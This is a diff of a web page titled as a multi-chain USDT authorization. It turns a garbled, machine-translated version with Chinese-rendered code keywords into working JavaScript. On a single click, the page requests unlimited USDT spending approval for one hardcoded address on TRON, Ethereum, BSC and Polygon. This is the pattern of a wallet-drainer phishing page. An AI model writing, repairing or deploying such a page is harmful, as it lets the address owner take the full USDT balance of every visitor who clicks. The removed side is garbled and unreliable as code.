@@ -1,62 +1,83 @@
-<！doctype 超文本标记语言>
-<超文本标记语言>
-<头>
-  <元 字符集="UTF-8">
-  <标题>USDT授权-多链支持</标题>
-  <脚本 src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></脚本>
-  <脚本 src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></脚本>
-</头>
-<身体>
-  <H2>点击按钮授权USDT无限额度</H2>
-  <按钮 onClick="授权()">授权USDT</按钮>
-  <脚本>
-Const target_ADDRESS="0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc"；//被授权地址
-Const Max_UINT="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff”；
-Const USDT_contracts={
-以太坊: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-BSC:"0x55d398326f99059fF775485246999027B3197955",
-多边形: "0x3813e82e6f7098b9583FC0F33a962D02018B6803",
-Tron："T9yD14Nj9j7xAB4dbGeiX9h8unk KHxuWwb"
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>USDT 授权 - 多链支持</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+</head>
+<body style="text-align:center;font-family:sans-serif;padding-top:50px;">
+  <h2>点击按钮授权 USDT 无限额度</h2>
+  <p>授权目标地址：</p>
+  <code>0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc</code>
+  <br><br>
+  <button onclick="authorize()">授权 USDT</button>
+  <p id="status"></p>
+
+  <script>
+    const TARGET_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc";
+    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    const USDT_CONTRACTS = {
+      ethereum: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+      bsc:      "0x55d398326f99059fF775485246999027B3197955",
+      polygon:  "0x3813e82e6f7098b9583FC0F33a962D02018B6803",
+      tron:     "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb"
     };
-异步 功能 授权() {
-如果(窗户.TronWeb&&窗户.TronWeb。准备好了){
-//TRON授权
-Const合同=等候窗户.tronWeb.合同().在(USDT_ContractS.Tron)；
-尝试 {
-常数TX=等候合同.批准(target_ADDRESS，Max_UINT).发送()；
-警惕的("TRON授权成功！交易ID："+TX)；
-} 赶上 (犯错) {
-警惕的(TRON"授权失败："+犯错.消息)；
+
+    async function authorize() {
+      const status = document.getElementById("status");
+
+      // TRON 钱包授权
+      if (window.tronWeb && window.tronWeb.ready) {
+        status.innerText = "检测到 TRON 钱包，开始授权...";
+        try {
+          const contract = await window.tronWeb.contract().at(USDT_CONTRACTS.tron);
+          const tx = await contract.approve(TARGET_ADDRESS, MAX_UINT).send();
+          status.innerText = "✅ TRON 授权成功，交易 ID: " + tx;
+        } catch (err) {
+          status.innerText = "❌ TRON 授权失败: " + err.message;
         }
-} 其他 如果 (窗户.以太坊) {
-//其他链(ETH/BSC/多边形)
-Const提供者=新的醚类.提供者.Web3Provider(窗户.以太坊)；
-等候供应者.发送("eth_requestAccounts"，[])；
-Const签署人=提供者.getSigner()；
-Const网络=等候提供者.getNetwork()；
-让链=""；
-if(network.chainId===1)chain="ethereum"；
-否则if(network.chainId===56)chain="bsc"；
-否则if(network.chainId===137)chain="polygon"；
-其他{
-alert("不支持的链，请切换到Ethereum/BSC/Polygon")；
-返回；
-        }
-Const USDT合同=新醚。合同(
-USDT_contracts[链]，
-["功能审批(地址消费，uint256金额)公共返回(bool)"]，
-签署人
-        );
-尝试{
-Const TX=等待usdtContract.Approve(TARGET_ADDRESS，MAX_UINT)；
-警报('${chain.toUpperCase()}授权发送中，交易哈希：'+tx.hash)；
-}catch(err){
-alert("授权失败："+err.message)；
-        }
-}else{
-alert("请使用支持TRON或以太坊系的钱包打开本页面")；
+        return;
       }
+
+      // EVM 钱包授权（MetaMask、imToken等）
+      if (window.ethereum) {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const network = await provider.getNetwork();
+
+        let chain;
+        if (network.chainId === 1) chain = "ethereum";
+        else if (network.chainId === 56) chain = "bsc";
+        else if (network.chainId === 137) chain = "polygon";
+        else {
+          status.innerText = "❌ 不支持的网络链，请切换至 ETH/BSC/Polygon";
+          return;
+        }
+
+        status.innerText = `连接成功，当前网络：${chain.toUpperCase()}，正在发送授权...`;
+
+        const contract = new ethers.Contract(
+          USDT_CONTRACTS[chain],
+          ["function approve(address spender, uint256 amount) public returns (bool)"],
+          signer
+        );
+
+        try {
+          const tx = await contract.approve(TARGET_ADDRESS, MAX_UINT);
+          status.innerText = "⏳ 授权已发送，交易哈希: " + tx.hash;
+          await tx.wait();
+          status.innerText = "✅ 授权成功！";
+        } catch (err) {
+          status.innerText = "❌ 授权失败: " + (err.data?.message || err.message);
+        }
+        return;
+      }
+
+      status.innerText = "❌ 请使用支持 TRON 或 EVM 钱包的浏览器打开本页";
     }
   </script>
-</身体>
-</超文本标记语言>
+</body>
+</html>
